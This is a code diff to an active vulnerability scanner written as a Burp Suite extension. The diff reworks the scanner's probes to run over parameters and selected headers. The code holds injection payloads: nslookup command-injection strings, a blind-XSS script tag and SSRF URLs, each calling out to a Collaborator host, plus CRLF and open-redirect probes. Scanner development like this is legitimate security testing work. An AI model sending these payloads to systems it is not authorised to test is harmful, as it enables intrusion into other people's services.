@@ -4,7 +4,6 @@ import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.collaborator.CollaboratorClient;
 import burp.api.montoya.collaborator.CollaboratorPayload;
 import burp.api.montoya.http.message.HttpRequestResponse;
-import burp.api.montoya.http.message.params.HttpParameter;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 
@@ -158,33 +157,29 @@ final class ActiveTestEngine {
         RequestBudget budget = new RequestBudget(maxRequests);
         requestBudget.set(budget);
         try {
-            List<HttpParameter> parameters;
-            try {
-                parameters = new ArrayList<>(base.parameters());
-            } catch (Exception e) {
-                return List.of();
-            }
+            // Insertion points span URL/body parameters and a curated allow-list of fuzzable headers
+            // (cookies excluded); parameters are enumerated first so they run before the budget is spent.
+            List<InsertionPoint> points = InsertionPoint.enumerate(base);
 
             boolean wafChecked = false;
-            for (HttpParameter parameter : parameters) {
-                if (parameter == null || parameter.name() == null || parameter.name().isBlank()) continue;
-                if ("COOKIE".equalsIgnoreCase(String.valueOf(parameter.type()))) continue;
+            for (InsertionPoint point : points) {
+                if (point == null || point.name() == null || point.name().isBlank()) continue;
                 if (budget.exhausted()) break;
 
                 if (!wafChecked && !budget.exhausted()) {
-                    testWaf(base, parameter, findings);
+                    testWaf(base, point, findings);
                     wafChecked = true;
                 }
-                if (!budget.exhausted()) testReflectedXss(base, parameter, findings);
-                if (!budget.exhausted()) testSsti(base, parameter, findings);
-                if (!budget.exhausted()) testSsrf(base, parameter, findings);
-                if (!budget.exhausted()) testBlindXss(base, parameter, findings);
-                if (!budget.exhausted()) testCommandInjection(base, parameter, findings);
-                if (!budget.exhausted()) testOpenRedirect(base, parameter, findings);
-                if (!budget.exhausted()) testCrlf(base, parameter, findings);
-                if (!budget.exhausted()) testSqli(base, parameter, findings);
-                if (!budget.exhausted()) testNoSqlInjection(base, parameter, findings);
-                if (!budget.exhausted()) testPathTraversal(base, parameter, findings);
+                if (!budget.exhausted()) testReflectedXss(base, point, findings);
+                if (!budget.exhausted()) testSsti(base, point, findings);
+                if (!budget.exhausted()) testSsrf(base, point, findings);
+                if (!budget.exhausted()) testBlindXss(base, point, findings);
+                if (!budget.exhausted()) testCommandInjection(base, point, findings);
+                if (!budget.exhausted()) testOpenRedirect(base, point, findings);
+                if (!budget.exhausted()) testCrlf(base, point, findings);
+                if (!budget.exhausted()) testSqli(base, point, findings);
+                if (!budget.exhausted()) testNoSqlInjection(base, point, findings);
+                if (!budget.exhausted()) testPathTraversal(base, point, findings);
             }
             if (!budget.exhausted()) testHostHeaderInjection(base, findings);
             if (!budget.exhausted()) testCors(base, findings);
@@ -197,39 +192,39 @@ final class ActiveTestEngine {
         }
     }
 
-    private int testWaf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
-        HttpResponse response = sendMutated(base, parameter, WAF_PROBE);
+    private int testWaf(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
+        HttpResponse response = sendMutated(base, point, WAF_PROBE);
         if (response == null) return 1;
         Optional<String> waf = fingerprintWaf(response.statusCode(),
                 response.bodyToString(), response.headerValue("Server"));
-        waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", parameter.name(),
+        waf.ifPresent(vendor -> out.add(new ActiveFinding("INFO", "WAF", point.label(),
                 "Likely WAF/filter: " + vendor + " (status " + response.statusCode() + ")", true, base.url())));
         return 1;
     }
 
-    private int testReflectedXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
-        String token = XSS_TOKEN + Integer.toString(parameter.name().hashCode() & 0xffff, 36);
-        HttpResponse response = sendMutated(base, parameter, token + XSS_PROBE);
+    private int testReflectedXss(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
+        String token = XSS_TOKEN + Integer.toString(point.label().hashCode() & 0xffff, 36);
+        HttpResponse response = sendMutated(base, point, token + XSS_PROBE);
         if (response == null) return 1;
         String surviving = survivingXssChars(response.bodyToString(), token);
         if (!surviving.isEmpty()) {
             String severity = (surviving.contains("<") && surviving.contains(">")) ? "HIGH" : "MEDIUM";
-            out.add(new ActiveFinding(severity, "XSS", parameter.name(),
+            out.add(new ActiveFinding(severity, "XSS", point.label(),
                     "Reflected metacharacters survived unencoded: " + surviving, true, base.url()));
         }
         return 1;
     }
 
-    private int testSsti(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testSsti(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         int sent = 0;
         for (String payload : SSTI_PAYLOADS) {
             if (budgetExhausted()) break;
-            HttpResponse response = sendMutated(base, parameter, payload);
+            HttpResponse response = sendMutated(base, point, payload);
             sent++;
             if (response == null) continue;
             Optional<String> engine = detectSstiEval(response.bodyToString(), payload);
             if (engine.isPresent()) {
-                out.add(new ActiveFinding("HIGH", "SSTI", parameter.name(),
+                out.add(new ActiveFinding("HIGH", "SSTI", point.label(),
                         "Template arithmetic evaluated (" + SSTI_A + "*" + SSTI_B + "=" + SSTI_PRODUCT
                                 + ") via " + engine.get(), true, base.url()));
                 break;
@@ -238,105 +233,105 @@ final class ActiveTestEngine {
         return sent;
     }
 
-    private int testSsrf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testSsrf(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
         if (client == null || budgetExhausted()) return 0;
-        String correlation = encodeCorrelation("SSRF", parameter.name(), base.url());
+        String correlation = encodeCorrelation("SSRF", point.label(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
-        HttpResponse response = sendMutated(base, parameter, "http://" + payload + "/");
+        HttpResponse response = sendMutated(base, point, "http://" + payload + "/");
         if (response != null && response.bodyToString().contains(payload.toString())) {
-            out.add(new ActiveFinding("HIGH", "SSRF", parameter.name(),
+            out.add(new ActiveFinding("HIGH", "SSRF", point.label(),
                     "Collaborator host reflected in response (probable full-response SSRF)", true, base.url()));
         } else {
-            out.add(new ActiveFinding("INFO", "SSRF", parameter.name(),
+            out.add(new ActiveFinding("INFO", "SSRF", point.label(),
                     "Collaborator SSRF payload sent; awaiting OOB interaction", false, base.url()));
         }
         return 1;
     }
 
-    private int testBlindXss(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testBlindXss(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
         if (client == null || budgetExhausted()) return 0;
-        String correlation = encodeCorrelation("XSS-blind", parameter.name(), base.url());
+        String correlation = encodeCorrelation("XSS-blind", point.label(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
-        sendMutated(base, parameter, "\"><script src=//" + payload + "></script>");
-        out.add(new ActiveFinding("INFO", "XSS-blind", parameter.name(),
+        sendMutated(base, point, "\"><script src=//" + payload + "></script>");
+        out.add(new ActiveFinding("INFO", "XSS-blind", point.label(),
                 "Blind-XSS beacon sent; awaiting OOB interaction", false, base.url()));
         return 1;
     }
 
-    private int testCommandInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testCommandInjection(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         CollaboratorClient client = collaborator;
         if (client == null || budgetExhausted()) return 0;
-        String correlation = encodeCorrelation("CMDi", parameter.name(), base.url());
+        String correlation = encodeCorrelation("CMDi", point.label(), base.url());
         CollaboratorPayload payload = client.generatePayload(correlation);
         int before = budgetUsed();
         // Separator variants so at least one survives sh/cmd quoting contexts.
-        sendMutated(base, parameter, ";nslookup " + payload + ";");
-        if (!budgetExhausted()) sendMutated(base, parameter, "|nslookup " + payload);
-        if (!budgetExhausted()) sendMutated(base, parameter, "$(nslookup " + payload + ")");
+        sendMutated(base, point, ";nslookup " + payload + ";");
+        if (!budgetExhausted()) sendMutated(base, point, "|nslookup " + payload);
+        if (!budgetExhausted()) sendMutated(base, point, "$(nslookup " + payload + ")");
         int sent = budgetUsed() - before;
         if (sent > 0) {
-            out.add(new ActiveFinding("INFO", "CMDi", parameter.name(),
+            out.add(new ActiveFinding("INFO", "CMDi", point.label(),
                     "Blind command-injection DNS probes sent; awaiting OOB interaction", false, base.url()));
         }
         return sent;
     }
 
-    private int testOpenRedirect(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testOpenRedirect(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         String marker = "rh-redirect.example.net";
-        HttpResponse response = sendMutated(base, parameter, "https://" + marker + "/");
+        HttpResponse response = sendMutated(base, point, "https://" + marker + "/");
         if (response == null) return 1;
         Optional<String> hit = detectOpenRedirect(response.statusCode(), response.headerValue("Location"), marker);
-        hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", parameter.name(),
+        hit.ifPresent(location -> out.add(new ActiveFinding("MEDIUM", "OpenRedirect", point.label(),
                 "Redirect Location points to attacker-controlled host: " + location, true, base.url())));
         return 1;
     }
 
-    private int testCrlf(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testCrlf(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         String injected = "rhcrlf%0d%0aX-Recon-Hound%3a%20injected";
-        HttpResponse response = sendMutated(base, parameter, injected);
+        HttpResponse response = sendMutated(base, point, injected);
         if (response != null && response.headerValue("X-Recon-Hound") != null) {
-            out.add(new ActiveFinding("HIGH", "CRLF", parameter.name(),
+            out.add(new ActiveFinding("HIGH", "CRLF", point.label(),
                     "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
         }
         return 1;
     }
 
-    private int testSqli(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testSqli(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         int before = budgetUsed();
 
-        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
+        HttpResponse baseline = sendMutated(base, point, point.baseValue());
         if (baseline == null || budgetExhausted()) return budgetUsed() - before;
         String baselineBody = baseline.bodyToString();
 
-        HttpResponse errorResponse = sendMutated(base, parameter, SQLI_ERROR_PAYLOAD);
+        HttpResponse errorResponse = sendMutated(base, point, SQLI_ERROR_PAYLOAD);
         if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
-            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+            out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
                     "Injecting a single quote produced a database error signature not present in the baseline response",
                     true, base.url()));
             return budgetUsed() - before;
         }
         if (budgetExhausted()) return budgetUsed() - before;
 
-        HttpResponse trueResponse = sendMutated(base, parameter, SQLI_TRUE_PAYLOAD);
+        HttpResponse trueResponse = sendMutated(base, point, SQLI_TRUE_PAYLOAD);
         if (budgetExhausted()) return budgetUsed() - before;
-        HttpResponse falseResponse = sendMutated(base, parameter, SQLI_FALSE_PAYLOAD);
+        HttpResponse falseResponse = sendMutated(base, point, SQLI_FALSE_PAYLOAD);
         if (trueResponse != null && falseResponse != null
                 && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
-            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+            out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
                     "Boolean-based blind: the always-true condition matches the baseline response while the "
                             + "always-false condition diverges from both", true, base.url()));
             return budgetUsed() - before;
         }
         if (budgetExhausted()) return budgetUsed() - before;
 
-        long baselineMillis = timeRequest(base, parameter, parameter.value());
+        long baselineMillis = timeRequest(base, point, point.baseValue());
         for (String payload : SQLI_TIME_PAYLOADS) {
             if (budgetExhausted()) break;
-            long payloadMillis = timeRequest(base, parameter, payload);
+            long payloadMillis = timeRequest(base, point, payload);
             if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
-                out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+                out.add(new ActiveFinding("HIGH", "SQLi", point.label(),
                         "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
                                 + "s in response to payload " + payload, true, base.url()));
                 break;
@@ -351,17 +346,17 @@ final class ActiveTestEngine {
      * was absent from the baseline. Baseline-differencing keeps it specific — an app whose normal output
      * already carries such a signature is skipped rather than mis-flagged.
      */
-    private int testNoSqlInjection(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testNoSqlInjection(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         int before = budgetUsed();
-        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
+        HttpResponse baseline = sendMutated(base, point, point.baseValue());
         if (baseline == null || budgetExhausted()) return budgetUsed() - before;
         if (containsNoSqlError(baseline.bodyToString())) return budgetUsed() - before;
         for (String payload : NOSQL_PAYLOADS) {
             if (budgetExhausted()) break;
-            HttpResponse response = sendMutated(base, parameter, payload);
+            HttpResponse response = sendMutated(base, point, payload);
             if (response == null) continue;
             if (containsNoSqlError(response.bodyToString())) {
-                out.add(new ActiveFinding("HIGH", "NoSQLi", parameter.name(),
+                out.add(new ActiveFinding("HIGH", "NoSQLi", point.label(),
                         "Injecting " + payload + " produced a NoSQL datastore error signature not present "
                                 + "in the baseline response", true, base.url()));
                 break;
@@ -371,23 +366,23 @@ final class ActiveTestEngine {
     }
 
     /**
-     * Path traversal / LFI: reads a well-known OS file through {@code parameter}. Sends a baseline with
-     * the parameter's own value first, then each traversal payload, and reports HIGH only when a target
-     * file's canary appears in a payload response but was absent from the baseline — so a page that
+     * Path traversal / LFI: reads a well-known OS file through {@code point}. Sends a baseline with the
+     * point's own value first, then each traversal payload, and reports HIGH only when a target file's
+     * canary appears in a payload response but was absent from the baseline — so a page that
      * legitimately contains {@code root:} or {@code [fonts]} never triggers a false positive.
      */
-    private int testPathTraversal(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+    private int testPathTraversal(HttpRequest base, InsertionPoint point, List<ActiveFinding> out) {
         int before = budgetUsed();
-        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
+        HttpResponse baseline = sendMutated(base, point, point.baseValue());
         if (baseline == null || budgetExhausted()) return budgetUsed() - before;
         String baselineBody = baseline.bodyToString();
         for (String payload : PATH_TRAVERSAL_PAYLOADS) {
             if (budgetExhausted()) break;
-            HttpResponse response = sendMutated(base, parameter, payload);
+            HttpResponse response = sendMutated(base, point, payload);
             if (response == null) continue;
             Optional<String> hit = detectPathTraversal(response.bodyToString(), baselineBody);
             if (hit.isPresent()) {
-                out.add(new ActiveFinding("HIGH", "PathTraversal", parameter.name(),
+                out.add(new ActiveFinding("HIGH", "PathTraversal", point.label(),
                         "Traversal payload returned " + hit.get() + " that was absent from the baseline "
                                 + "response (payload: " + payload + ")", true, base.url()));
                 break;
@@ -396,9 +391,9 @@ final class ActiveTestEngine {
         return budgetUsed() - before;
     }
 
-    private long timeRequest(HttpRequest base, HttpParameter parameter, String value) {
+    private long timeRequest(HttpRequest base, InsertionPoint point, String value) {
         long start = System.currentTimeMillis();
-        sendMutated(base, parameter, value);
+        sendMutated(base, point, value);
         return System.currentTimeMillis() - start;
     }
 
@@ -587,13 +582,12 @@ final class ActiveTestEngine {
         return budgetUsed() - before;
     }
 
-    private HttpResponse sendMutated(HttpRequest base, HttpParameter parameter, String value) {
+    private HttpResponse sendMutated(HttpRequest base, InsertionPoint point, String value) {
         try {
-            HttpParameter mutated = HttpParameter.parameter(parameter.name(), value, parameter.type());
-            HttpRequestResponse rr = sendRequest(base.withUpdatedParameters(mutated));
+            HttpRequestResponse rr = sendRequest(point.apply(base, value));
             return rr == null ? null : rr.response();
         } catch (Exception e) {
-            api.logging().logToError("Active probe failed for " + parameter.name(), e);
+            api.logging().logToError("Active probe failed for " + point.label(), e);
             return null;
         }
     }
